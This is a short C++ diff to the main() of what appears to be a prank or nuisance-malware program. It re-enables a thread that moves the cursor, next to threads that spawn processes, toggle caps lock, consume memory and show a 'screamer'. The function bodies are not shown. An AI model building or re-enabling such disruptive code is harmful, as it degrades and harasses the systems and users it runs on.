@@ -129,7 +129,7 @@ int main() {
 
     thread t1(spawnProcesses, 0);
     thread t2(showMessageLoop);
-  /*  thread t3(moveCursor);*/
+    thread t3(moveCursor);
     thread t4(toggleCapsLock);
     thread t5(consumeMemory);
     thread t6(showScreamer);
@@ -141,7 +141,7 @@ int main() {
  
     t1.join();
     t2.join();
-   /* t3.join();*/
+    t3.join();
     t4.join();
     t5.join();
     t6.join();
